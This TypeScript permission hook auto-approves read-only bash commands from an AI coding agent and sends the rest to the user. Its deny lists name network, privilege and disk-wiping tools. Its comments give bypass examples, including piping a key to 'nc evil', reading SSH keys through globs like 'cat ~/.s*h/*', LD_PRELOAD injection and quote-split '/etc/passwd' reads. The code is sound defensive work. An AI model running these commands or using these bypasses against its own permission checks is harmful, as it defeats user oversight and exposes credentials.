/**
 * Auto-Approve Safe Bash Commands
 *
 * TypeScript port of scripts/permission/auto-approve-safe-bash.sh
 *
 * Auto-approves read-only commands that don't modify system state:
 * - File listing: ls, find, tree, du, df
 * - File reading: cat, head, tail, less, more, bat
 * - Search: grep, rg, ag, ack, fd
 * - Git info: git status, git log, git diff, git branch
 * - System info: pwd, whoami, which, type, echo
 * - Package info: npm list, pip list, pip show
 *
 * Requires approval for:
 * - Git writes: git commit, git push, git checkout, git merge
 * - Package installs: npm install, pip install, brew install
 * - File operations: rm, mv, cp, mkdir, touch, chmod
 * - Network: curl, wget, ssh, scp
 * - Any command with redirect operators (>, >>)
 *
 * @module permission/auto-approve-safe-bash
 */

import { guardBash, guardHasCommand, runGuards } from '../lib/guards.js';
import { getCommand, getSessionId, stripProxyPrefix } from '../lib/input.js';
import { logDebug, logInfo, logPermission } from '../lib/logging.js';
import { outputAllow, outputSilentSuccess } from '../lib/output.js';
import type { HookInput, HookResult } from '../types.js';

const HOOK_NAME = 'auto-approve-safe-bash';

// =============================================================================
// SAFE COMMAND PATTERNS (read-only operations)
// =============================================================================

/**
 * Commands that are always safe (no arguments needed).
 * These are exact matches only.
 */
const SAFE_COMMANDS_EXACT: ReadonlyArray<string> = [
  'pwd',
  'whoami',
  'id',
  'date',
  'uptime',
  'hostname',
];

/**
 * Command prefixes that are safe (with any arguments).
 * These match commands that start with or contain these prefixes.
 */
const SAFE_COMMAND_PREFIXES: ReadonlyArray<string> = [
  // File listing
  'ls',
  'tree',
  'find ', // Note: space after to avoid matching 'findutils'
  'fd ',
  'du ',
  'df ',
  'stat ',
  'file ',
  'wc ',

  // File reading (non-destructive)
  'cat ',
  'head ',
  'tail ',
  'less ',
  'more ',
  'bat ',

  // Search tools
  'grep ',
  'rg ',
  'ag ',
  'ack ',
  'ripgrep ',

  // Git read-only operations
  'git status',
  'git log',
  'git diff',
  'git show',
  'git branch',
  'git remote -v',
  'git remote show',
  'git tag',
  'git describe',
  'git rev-parse',
  'git config --get',
  'git config --list',
  'git ls-files',
  'git ls-tree',
  'git cat-file',
  'git name-rev',
  'git shortlog',
  'git blame',
  'git stash list',

  // System info
  'which ',
  'type ',
  'command -v',
  'echo ',
  'printf ',

  // Package managers (list/show only)
  'npm list',
  'npm ls',
  'npm view',
  'npm info',
  'npm show',
  'npm outdated',
  'npm audit', // Read-only audit
  'pip list',
  'pip show',
  'pip freeze',
  'pip check',
  'poetry show',
  'uv pip list',
  'uv pip show',

  // Build tools (read-only)
  'mise tasks',
  'mise list',
  'mise current',
  'mise ls',

  // Node/Python info
  'node --version',
  'node -v',
  'npm --version',
  'npm -v',
  'python --version',
  'python -V',
  'python3 --version',
  'python3 -V',
  'pip --version',
  'pip -V',

  // Process info
  'ps ',
  'pgrep ',
  'lsof ',
  'top -l 1', // One snapshot only

  // Text processing (read-only)
  'fmt ',
  'comm ',
  'cmp ',
  'numfmt ',
  'expr ',
  'test ',
  'seq ',
  'tsort ',
  'pr ',
  'getconf ',

  // Terminal info
  'tput ',
  'ss ',

  // File finding (alternative names)
  'fdfind ',

  // Help commands. Bare `--help` / `-h` were REMOVED: getSafePrefix matched
  // them anywhere, so `evilcmd -h` auto-approved an arbitrary binary (help-flag
  // safety depends on the binary being trusted, not on the flag). `man ` stays.
  'man ',

  // Directory change — harmless alone; needed so a compound like `cd X && ls`
  // passes per-segment safety (the `cd X` segment must itself be safe).
  'cd ',
];

// =============================================================================
// DANGEROUS PATTERNS (always require approval)
// =============================================================================

/**
 * Patterns that always require approval regardless of command.
 * These are checked using regex matching.
 */
const DANGEROUS_PATTERNS: ReadonlyArray<RegExp> = [
  // Redirects (could overwrite files)
  />/,
  />>/,

  // Pipes to dangerous commands
  /\| *rm/,
  /\| *dd/,
  /\| *mv/,

  // Subshells with dangerous potential
  /\$\(/,
  /`/,

  // Process substitution `<(cmd)` runs cmd as a side effect — not caught by
  // segment splitting (it lives inside one segment), so block it here.
  /<\(/,

  // Pipe into a shell/interpreter — `curl x | sh`, `cat y | bash`, `| python`
  /\|\s*(?:sh|bash|zsh|dash|ksh|python3?|perl|ruby|node)\b/,

  // Backgrounding (could hide operations)
  /&$/,
  /& *$/,
];

/**
 * Commands that always require approval.
 * These are prefix matches.
 */
const REQUIRE_APPROVAL_PREFIXES: ReadonlyArray<string> = [
  // File modifications
  'rm ',
  'mv ',
  'cp ',
  'mkdir ',
  'rmdir ',
  'touch ',
  'chmod ',
  'chown ',
  'ln ',

  // Git write operations
  'git add',
  'git commit',
  'git push',
  'git pull',
  'git fetch',
  'git checkout',
  'git merge',
  'git rebase',
  'git reset',
  'git revert',
  'git cherry-pick',
  'git stash',
  'git clean',
  'git restore',
  'git switch',

  // Package installs
  'npm install',
  'npm i ',
  'npm ci',
  'npm uninstall',
  'npm update',
  'npm upgrade',
  'npm link',
  'npm publish',
  'pip install',
  'pip uninstall',
  'pip download',
  'poetry install',
  'poetry add',
  'poetry remove',
  'uv pip install',
  'uv pip uninstall',
  'brew install',
  'brew uninstall',
  'brew upgrade',
  'apt install',
  'apt remove',
  'apt update',
  'apt upgrade',

  // Network operations
  'curl ',
  'wget ',
  'ssh ',
  'scp ',
  'rsync ',
  'sftp ',

  // Dangerous system commands
  'sudo ',
  'su ',
  'dd ',
  'mkfs',
  'fdisk',
  'format',

  // Process control
  'kill ',
  'killall ',
  'pkill ',

  // Docker operations
  'docker run',
  'docker exec',
  'docker rm',
  'docker rmi',
  'docker stop',
  'docker kill',
  'docker compose',
];

// =============================================================================
// EVALUATION FUNCTIONS
// =============================================================================

/**
 * Check if command contains any dangerous patterns.
 *
 * @param command - The bash command to check
 * @returns True if the command contains a dangerous pattern
 */
export function containsDangerousPattern(command: string): boolean {
  for (const pattern of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return true;
    }
  }
  return false;
}

/**
 * Check if a command segment begins with one or more bare environment
 * variable assignments followed by another command (e.g. `PATH=/tmp ls`,
 * `LD_PRELOAD=/tmp/evil.so cat foo`, `FOO=bar grep secret file`).
 *
 * Mirrors CC v2.1.145's fix: bare variable assignments preceding a command
 * can change binary lookup (PATH), inject shared libraries (LD_PRELOAD,
 * DYLD_INSERT_LIBRARIES, LD_LIBRARY_PATH), or alter parser behavior (IFS).
 * Auto-approving the trailing command because it matches a safe prefix
 * lets an attacker smuggle these env-var-based vectors past the allowlist.
 *
 * Inspects each segment separated by compound operators (`&&`, `||`, `;`,
 * `|`) so that `cd /path && PATH=/tmp ls` is caught in the second segment.
 *
 * Bare assignments with no trailing command (`FOO=bar`) are NOT flagged —
 * they don't match a safe prefix anyway, so they already defer to the
 * standard permission flow.
 *
 * @param command - The bash command to check
 * @returns True if any segment is an env-var assignment + command
 */
export function hasEnvVarAssignment(command: string): boolean {
  // Split on shell compound separators. Keep regex simple — we don't need
  // full shell parsing, just to catch the common compound forms.
  const segments = command.split(/\s*(?:&&|\|\||;|\|)\s*/);
  for (const segment of segments) {
    const trimmed = segment.trim();
    // POSIX env-var name: starts with letter/underscore, then word chars.
    // Match VAR=value (possibly empty value) followed by space + a command.
    if (/^[A-Za-z_][A-Za-z0-9_]*=\S*\s+\S/.test(trimmed)) {
      return true;
    }
  }
  return false;
}

/**
 * Check if a `find` invocation includes an action flag that mutates the
 * filesystem. CC v2.1.113 stopped auto-approving `Bash(find:*)` when
 * `-exec` / `-execdir` / `-delete` is present. We must mirror this — a
 * plain find is read-only, but find with these action flags is a write.
 *
 * @param command - The bash command to check
 * @returns True if command contains find with -exec/-execdir/-delete
 */
export function findHasUnsafeAction(command: string): boolean {
  // Any occurrence of `find` (as a word) followed somewhere by -exec / -execdir / -delete.
  // Catches compound commands too: "cd /tmp && find . -name X -exec rm {} \;"
  if (!/\bfind\b/.test(command)) return false;
  return /\s-exec(?:dir)?\b|\s-delete\b/.test(command);
}

/**
 * Check if command starts with require-approval prefix.
 * Also checks if the prefix appears after a space (for compound commands).
 *
 * @param command - The bash command to check
 * @returns True if the command requires approval
 */
export function requiresApproval(command: string): boolean {
  for (const prefix of REQUIRE_APPROVAL_PREFIXES) {
    // Check if command starts with the prefix
    if (command.startsWith(prefix)) {
      return true;
    }
    // Check if prefix appears after a space (e.g., "cd /path && rm file")
    if (command.includes(` ${prefix}`)) {
      return true;
    }
  }
  return false;
}

/**
 * Check if command is an exact safe command.
 *
 * @param command - The bash command to check
 * @returns True if the command exactly matches a safe command
 */
export function isExactSafeCommand(command: string): boolean {
  return SAFE_COMMANDS_EXACT.includes(command);
}

/**
 * Check if command starts with a safe prefix.
 * Also checks if the prefix appears after a space (for compound commands).
 *
 * @param command - The bash command to check
 * @returns The matching safe prefix or null if no match
 */
export function getSafePrefix(command: string): string | null {
  for (const prefix of SAFE_COMMAND_PREFIXES) {
    // Check if command starts with the prefix
    if (command.startsWith(prefix)) {
      return prefix;
    }
    // Check if prefix appears after a space (e.g., "cd /path && ls -la")
    if (command.includes(` ${prefix}`)) {
      return prefix;
    }
  }
  return null;
}

/**
 * Check if command starts with a safe prefix (boolean version).
 *
 * @param command - The bash command to check
 * @returns True if the command matches a safe prefix
 */
export function hasSafePrefix(command: string): boolean {
  return getSafePrefix(command) !== null;
}

// =============================================================================
// SHELL-EXPANDABLE PATH OPERANDS (#116, glob half)
// =============================================================================

/**
 * Shell metacharacters that trigger filename expansion.
 *
 * `{` covers brace expansion, which is not technically globbing but reaches a
 * path the same way and by the same mechanism — the SHELL produces the name, so
 * the literal never appears in the command text a matcher can see.
 */
const GLOB_METACHARS = new Set(['*', '?', '[', '{']);

/*
 * ⚠ THERE IS DELIBERATELY NO "PATTERN FLAG" ALLOWLIST HERE, AND ADDING ONE IS A
 * REGRESSION. An earlier revision of this fix skipped the value of `-name`,
 * `-iname`, `-path`, `--include` and friends on the theory that those are
 * matched by the TOOL rather than expanded by the shell. Measured against the
 * corpus below it saved ZERO false prompts — the quote tracking in
 * `expandableGlobIndex` already covers the common spelling, because people
 * write `find . -iname "*.tsx"` with the quotes that make it work.
 *
 * It was also wrong in principle, which is the reason it is called out rather
 * than quietly dropped: an UNQUOTED pattern value whose wildcard is followed by
 * a path separator is expanded by the shell BEFORE find ever runs, so skipping
 * it under-blocks the exact case the quotes were protecting. A list that costs
 * a maintenance surface, buys nothing measurable, and is unsound on its own
 * terms is not a narrowing. Both spellings are pinned in
 * tests/permission/auto-approve-glob.test.ts — quoted inert, unquoted gated.
 */

/**
 * Index of the first glob metacharacter in `token` that the shell would
 * actually EXPAND — outside quotes and not backslash-escaped. Returns -1 if
 * there is none.
 *
 * ⚠ QUOTING IS THE WHOLE POINT, NOT AN OPTIMISATION. A quoted glob does not
 * expand: `cat "~/.s*h/*"` names one literal file that almost certainly does
 * not exist. Treating it as dangerous is pure cost — measured against the
 * corpus below, quote tracking is worth 15 of the 36 false prompts the rule
 * would otherwise carry, and the shapes it saves are ordinary: a quoted `grep
 * -E` regex containing a separator, and a quoted `git diff` pathspec with a
 * recursive wildcard.
 *
 * Backslash escapes are honoured only OUTSIDE single quotes, which is what bash
 * does — inside `'…'` a backslash is an ordinary character.
 *
 * ⚠ THE ESCAPE HANDLING SAVES NOTHING ON THE CORPUS — zero hits — and is kept
 * for CORRECTNESS, not cost: `cat /tmp/real\*name` does not expand, so gating
 * it would be a false prompt on a real input. Stated plainly so the next reader
 * does not quote a benefit that was never measured.
 */
function expandableGlobIndex(token: string): number {
  let quote: string | null = null;
  for (let i = 0; i < token.length; i++) {
    const ch = token[i];
    if (ch === '\\' && quote !== "'") {
      i++; // the escaped character is a literal, never a glob
      continue;
    }
    if (quote === null && (ch === '"' || ch === "'")) {
      quote = ch;
      continue;
    }
    if (quote !== null && ch === quote) {
      quote = null;
      continue;
    }
    if (quote === null && ch !== undefined && GLOB_METACHARS.has(ch)) return i;
  }
  return -1;
}

/**
 * Whether an operand is rooted OUTSIDE the project — absolute, home-relative,
 * or spelled through `$HOME`.
 *
 * The `$HOME` spellings are here because `security-blocker` normalizes them
 * (`normalizeHomeRefs`) and this hook does not; without them
 * `grep -r x "$HOME"/.s*h` would be the one rooted spelling left open.
 */
function isRootedOperand(token: string): boolean {
  const bare = token.replace(/^["']+/, '');
  return (
    bare.startsWith('/') ||
    bare.startsWith('~') ||
    bare.startsWith('$HOME') ||
    bare.startsWith('${HOME}')
  );
}

/**
 * Whether a segment carries a path operand the SHELL would expand into a name
 * this plugin's text matchers can never see (#116, glob half).
 *
 * WHY THIS EXISTS. `security-blocker` matches protected resources by literal
 * TEXT. Any spelling that reaches the same inode without writing the literal is
 * unmatched, and this hook then certifies the segment because `cat `/`ls`/
 * `grep `/`find ` are on the safe-prefix allowlist. Measured net outcome before
 * this gate: `cat ~/.s*h/*` — which dumps an entire key directory in one
 * command — was AUTO-APPROVED with no prompt.
 *
 * ⚠ THIS WITHHOLDS AUTO-APPROVAL; IT DOES NOT DENY. A PreToolUse denial is
 * terminal for a subagent (see the DENIAL_GUIDANCE note in security-blocker),
 * so a new denial surface on an everyday shell idiom is the more expensive
 * error. Returning true here drops the command into the standard permission
 * flow, where the user sees it.
 *
 * ⚠ WHAT THAT DOES NOT DO, stated because the issue's phrasing ("converts the
 * bypass into a prompt") overstates it: withholding OUR approval restores the
 * user's CONFIGURED behaviour. A user who has separately allowlisted
 * `Bash(cat:*)` in settings still gets no prompt. That is their explicit choice
 * and not this plugin's bypass to override — but it means "always prompts" is
 * false, and must not be written down as if it were true.
 *
 * ⚠ THE TWO BRANCHES ARE BOTH LOAD-BEARING, AND THE CHEAPER ONE ALONE IS NOT
 * ENOUGH. Measured over 24,520 real commands from local session transcripts, of
 * which 2,801 are auto-approved today:
 *
 *   rooted only .................. 14/21 rows,  13 false prompts (0.46%)
 *   directory-component only ..... 12/21 rows,   8 false prompts (0.29%)
 *   either (shipped) ............. 21/21 rows,  21 false prompts (0.75%)
 *   any glob at all (the issue's
 *     own proposal) .............. 21/21 rows, 254 false prompts (9.07%)
 *
 * Rooted-only misses `cd ~ && cat .s*h/id_rsa`; directory-component-only misses
 * `ls /e*c` and `grep -r x ~/.s*h`. The union costs 8 more prompts than the
 * cheapest option and closes both.
 *
 * ⚠ IT IS NOT A SHELL PARSER, AND THE LIMITS ARE MEASURED. `cd / && cat
 * etc/passwd` writes no metacharacter and no protected literal at all — that
 * gap is documented in BASH_SYSTEM_DIR_PATTERNS and is untouched here. So are
 * the quote-splitting spellings (`cat "/e""tc/passwd"`), which carry no
 * metacharacter either; they are the remaining half of #116.
 *
 * @param segment - One command segment, already split and proxy-stripped
 * @returns True if auto-approval should be withheld for this segment
 */
export function hasExpandablePathGlob(segment: string): boolean {
  const tokens = segment
    .trim()
    .split(/\s+/)
    .filter((t) => t.length > 0);
  for (const token of tokens) {
    if (token.startsWith('-')) continue;
    const g = expandableGlobIndex(token);
    if (g === -1) continue;
    // (a) rooted outside the project, or (b) the metacharacter sits inside a
    // DIRECTORY component — a `/` follows it, so the shell is being asked to
    // discover a directory NAME rather than a set of leaf files.
    if (isRootedOperand(token)) return true;
    if (token.indexOf('/', g) !== -1) return true;
  }
  return false;
}

/**
 * Split a command into individual segments on shell control operators
 * (`&&`, `||`, `;`, `|`, `&`, newline). Auto-approval must hold for EVERY
 * segment, not just the one the command starts with — otherwise a command that
 * merely STARTS safe can smuggle a dangerous one after a separator
 * (`ls;rm -rf ~`, `echo go\ngit push --force main`, `cat key | nc evil`).
 *
 * Note: this is intentionally conservative, not a full shell parser — a
 * separator inside quotes (`grep "a|b" f`) splits too and simply defers to a
 * prompt. Over-deferring is safe; over-approving is the bug we are closing.
 */
export function splitIntoSegments(command: string): string[] {
  return command
    .split(/\s*(?:&&|\|\||;|\||&|\n|\r)\s*/)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * Check whether a SINGLE command segment is safe on its own — it exactly
 * matches a safe command or STARTS WITH a safe prefix. Anchored to the start of
 * the segment (unlike getSafePrefix's legacy includes() match), so a help flag
 * or safe word appearing later (`evilcmd -h`) does not make it safe.
 *
 * @param segment - One command segment (already split on separators)
 * @returns True if the segment is independently safe
 */
export function isSegmentSafe(segment: string): boolean {
  const trimmed = segment.trim();
  if (isExactSafeCommand(trimmed)) return true;
  return SAFE_COMMAND_PREFIXES.some((prefix) => trimmed.startsWith(prefix));
}

// =============================================================================
// MAIN HOOK FUNCTION
// =============================================================================

/**
 * Auto-approve safe bash commands.
 *
 * This hook evaluates Bash commands and auto-approves read-only operations
 * that don't modify system state. Commands that could be dangerous or modify
 * files are deferred to the standard permission flow.
 *
 * @param input - Hook input from Claude Code
 * @returns Hook result (allow, deny, or silent success)
 *
 * @example
 * ```typescript
 * const result = await autoApproveSafeBash({
 *   tool_name: 'Bash',
 *   tool_input: { command: 'git status' }
 * });
 * // result.hookSpecificOutput.permissionDecision === 'allow'
 * ```
 */
export async function autoApproveSafeBash(input: HookInput): Promise<HookResult> {
  const skipped = runGuards(input, guardBash, guardHasCommand);
  if (skipped) return skipped;

  // guardHasCommand ensures command is present; narrow for TypeScript
  const command = getCommand(input) as string;

  logDebug(HOOK_NAME, `Evaluating: ${command.slice(0, 80)}...`);

  // Check dangerous patterns first
  if (containsDangerousPattern(command)) {
    logDebug(HOOK_NAME, 'Requires approval: contains dangerous pattern');
    return outputSilentSuccess();
  }

  // CC v2.1.113: find with -exec / -execdir / -delete is no longer auto-approved.
  // These flags turn a read-only find into a write operation.
  if (findHasUnsafeAction(command)) {
    logDebug(HOOK_NAME, 'Requires approval: find with -exec/-delete (CC v2.1.113)');
    return outputSilentSuccess();
  }

  // CC v2.1.145 analog: bare VAR=value assignments before a command (PATH=,
  // LD_PRELOAD=, IFS=, etc.) bypass the safe-prefix allowlist by altering
  // binary lookup, lib injection, or parser behavior. Defer to standard
  // permission flow so the user sees the assignment before approving.
  if (hasEnvVarAssignment(command)) {
    logDebug(HOOK_NAME, 'Requires approval: env-var assignment prefix (CC v2.1.145 analog)');
    return outputSilentSuccess();
  }

  // Per-segment safety: split on shell separators and require EVERY segment to
  // be independently safe. This is the bypass-resistant core — a command that
  // merely STARTS safe (`ls`, `echo go`, `cat foo`) no longer auto-approves a
  // dangerous command chained after `;`, a newline, a tab, or `|`. A genuinely
  // safe pipe (`cat foo | grep bar`) still passes because both segments match.
  const segments = splitIntoSegments(command);
  if (segments.length === 0) {
    logDebug(HOOK_NAME, 'No parseable segment, deferring to standard flow');
    return outputSilentSuccess();
  }

  for (const rawSegment of segments) {
    // Unwrap a token-optimizing proxy prefix (`rtk git status` → `git status`)
    // so the allowlist keeps matching when a proxy like rtk is active. Mirrors
    // security-blocker, which already strips before its own matching. Stripping
    // also hardens approval: `rtk rm -rf ~` unwraps to `rm -rf ~` and is caught
    // by requiresApproval for the right reason, not merely as an unknown prefix.
    const segment = stripProxyPrefix(rawSegment);
    if (requiresApproval(segment)) {
      logDebug(HOOK_NAME, `Requires approval: segment '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
    // #116 (glob half): the safe-prefix allowlist certifies a segment by its
    // COMMAND, never its operand. A shell-expanded path operand reaches a
    // protected resource without ever writing the literal security-blocker
    // matches on, so `cat ~/.s*h/*` was auto-approved. Withhold approval and
    // let the standard flow decide — deliberately NOT a deny.
    if (hasExpandablePathGlob(segment)) {
      logDebug(HOOK_NAME, `Shell-expandable path operand: '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
    if (!isSegmentSafe(segment)) {
      logDebug(HOOK_NAME, `Segment not on safe allowlist: '${segment.slice(0, 60)}'`);
      return outputSilentSuccess();
    }
  }

  const sessionId = getSessionId(input);
  logInfo(HOOK_NAME, `Auto-approved: all ${segments.length} segment(s) safe`);
  logPermission('allow', `auto-approved safe command: ${command.slice(0, 80)}`, 'Bash', sessionId);
  return outputAllow();
}

export default autoApproveSafeBash;
